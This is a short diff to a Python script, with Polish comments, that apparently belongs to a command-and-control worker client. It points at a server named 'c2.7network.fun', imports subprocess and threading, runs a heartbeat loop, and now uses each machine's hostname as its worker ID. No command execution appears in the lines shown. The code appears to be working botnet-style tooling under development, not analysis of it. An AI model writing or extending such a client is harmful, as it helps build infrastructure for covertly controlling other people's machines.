@@ -2,9 +2,10 @@ import requests
 import time
 import subprocess
 import threading
+import socket
 
 MAIN_VPS = "http://c2.7network.fun:7978"  # <-- wpisz IP main VPS
-WORKER_ID = "worker1"  # unikalny dla każdego workera
+WORKER_ID = socket.gethostname()  # automatyczny unikalny id
 
 def send_heartbeat():
     while True:
